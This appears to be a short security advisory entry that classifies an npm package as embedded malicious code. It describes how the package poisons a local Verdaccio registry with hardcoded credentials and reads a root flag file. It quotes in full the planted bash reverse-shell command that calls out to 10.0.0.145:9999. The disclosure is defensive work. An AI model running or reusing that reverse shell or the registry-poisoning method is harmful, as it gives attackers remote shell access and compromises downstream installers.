summary: Package plants reverse-shell payload into local npm registry and reads host files
details: index.js exports a `command()` function that, when invoked, authenticates against a local Verdaccio registry at http://0.0.0.0:4873 using hardcoded credentials ('vert99'/'vert99pass') and PUTs a package named 'uhclabs_local_check' whose `start` script is a bash reverse shell: `/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.145/9999 0>&1'`. Any subsequent consumer who installs and runs that planted package opens a reverse shell to 10.0.0.145:9999. The same code also reads /tmp/root_flag.txt from the host filesystem and writes it to stdout. The combination of registry poisoning, hardcoded auth credentials for the victim's private registry, an embedded reverse-shell payload, and arbitrary host file read constitutes a clear supply-chain attack on installers and any downstream consumers of their private registry.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
